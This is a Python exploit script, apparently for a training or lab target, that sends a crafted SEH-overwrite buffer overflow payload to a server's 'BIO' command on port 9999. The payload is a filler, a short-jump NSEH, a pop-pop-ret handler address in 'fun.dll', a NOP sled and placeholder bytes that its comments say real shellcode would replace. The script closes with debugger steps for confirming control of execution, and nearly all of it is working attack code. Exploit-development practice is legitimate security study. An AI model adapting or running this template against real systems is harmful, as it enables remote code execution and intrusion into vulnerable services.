#!/usr/bin/env python3
import socket
import sys
import struct

# Configure target details
TARGET_IP = "127.0.0.1"  
TARGET_PORT = 9999

def main():
    buffer_size = 128
    
    # 1. Fill the bio_buffer exactly up to the SEH structural frame
    filler = b"A" * buffer_size
    
    # 2. Overwrite Pointer to Next SEH record (NSEH) with a short jump
    # \xeb\x06 = JMP SHORT +6 bytes forward (skips directly over the SEH handler address)
    # \x90\x90 = NOP padding bytes to keep it exactly 4 bytes long
    nseh = b"\xeb\x06\x90\x90" 
    
    # 3. Overwrite the Exception Handler Pointer with your exact pop-pop-ret address
    # struct.pack('<I', ...) automatically formats 0x62501413 into Little-Endian bytes (\x13\x14\x50\x62)
    seh_handler = struct.pack('<I', 0x62501413)
    
    # 4. Safe landing zone (NOP Sled) right after skipping past the SEH block
    nop_sled = b"\x90" * 20
    
    # 5. Testing payload to prove execution control (fills EIP with "C"s / \x43)
    # In a real attack scenario, your shellcode would replace these bytes
    payload_marker = b"C" * 400
    
    # Assemble the full structured sequence matching your server's BIO command
    payload = b"BIO " + filler + nseh + seh_handler + nop_sled + payload_marker + b"\r\n"
    
    print(f"[*] Target POP-POP-RET address: 0x62501413")
    print(f"[*] Total payload length: {len(payload)} bytes")
    print(f"[*] Connecting to target {TARGET_IP}:{TARGET_PORT}...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT))
        
        # Read the initial welcome banner from the server
        banner = s.recv(1024)
        print("[+] Connected! Received server banner.")
        
        # Send the payload
        print("[*] Sending weaponized SEH bypass payload...")
        s.sendall(payload)
        
        s.close()
        print("[+] Payload transmitted successfully.")
        print("[*] STEP-BY-STEP DEBUGGING VERIFICATION:")
        print("    1. Pass the initial Access Violation crash exception in your debugger (Shift+F7).")
        print("    2. EIP will hit 0x62501413 (POP EDI) inside fun.dll.")
        print("    3. Step through (F7) the POP, POP, and RET instructions.")
        print("    4. You will land cleanly on your NOP sled (\x90) and slide into your 'C' buffer!")
        
    except Exception as e:
        print(f"[-] Connection failed or timed out: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
